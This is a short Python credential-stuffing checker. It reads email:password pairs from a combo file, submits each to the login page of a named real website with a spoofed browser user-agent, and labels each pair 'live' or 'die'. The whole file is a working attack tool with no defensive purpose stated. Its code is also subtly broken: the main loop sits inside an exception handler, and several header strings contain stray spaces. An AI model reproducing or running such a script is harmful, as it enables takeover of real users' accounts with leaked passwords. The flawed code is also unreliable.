
import requests
import sys

try:
    db = sys.argv[1]
    d1 = sys.argv[2]
except Exception:
    db = "db.txt"
    d1 = ":"

    f = open(db, 'r').readlines()

    for i in range(len(f)):
        email = f[i].split()[0].split(d1)[0]
        senha = f[i].split()[0].split(d1)[1]

        url = 'https://www.inpower.com.br/login'
        headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application / x - www - form - urlencoded',
        'origin': 'https://www.inpower.com.br',
        'referer': 'https://www.inpower.com.br / login',
        'user - agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'
        }

        data = f'Login.Email={email}&Login.Password={senha}&Login.Submit='

        r = requests.post(url, headers=headers, data=data).text

        if 'IsValid":true' in r:
            print(f"live{email}|{senha}")
        else:
            print(f"die{email}|{senha}")



